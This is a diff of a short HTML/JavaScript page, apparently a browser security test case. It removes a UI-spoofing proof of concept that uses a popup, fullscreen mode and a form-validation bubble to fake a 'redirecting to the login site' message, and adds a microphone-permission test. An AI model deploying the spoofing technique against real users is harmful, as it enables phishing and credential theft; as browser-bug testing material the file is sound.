@@ -1,34 +1,18 @@
-<button onclick="newWindow()">New Window</button>
-
-<button onclick="spoof()">Spoof</button>
-
-<input id="input1" type="text" minlength="4" style="display:block; opacity: 0;"></input>
 
 <script>
-window.spoofWindow = null;
+  function startMedia() 
+  {
+    window.navigator.mozGetUserMedia({audio:true}, function(stream) 
+    {
+	alert("success");
+    }, function(err) 
+    {
+	alert("fail");
+	//startMedia();
+    });
 
-document.getElementById("input1").setCustomValidity("Spoof window is ready!");
+ }
 
-function newWindow() {
-   spoofWindow = window.open("", "", "popup")
-   spoofWindow.document.write(`
-   <input id="input1" type="text" minlength="4" style="opacity: 0;"></input>
-
-    <script>
-    document.getElementById("input1").setCustomValidity("Please wait while we redirecting to the login site..");
-    <\/script>`)
-   document.getElementById("input1").reportValidity();
-}
-
-function spoof() {
-   document.body.requestFullscreen();
-
-   setTimeout(function() {
-      spoofWindow.document.getElementById("input1").reportValidity();
-    }, 200)
-
-   setTimeout(function() {
-      spoofWindow.close();
-    }, 3600)
-}
 </script>
+
+<a href="javascript:startMedia();">get microphone</a>
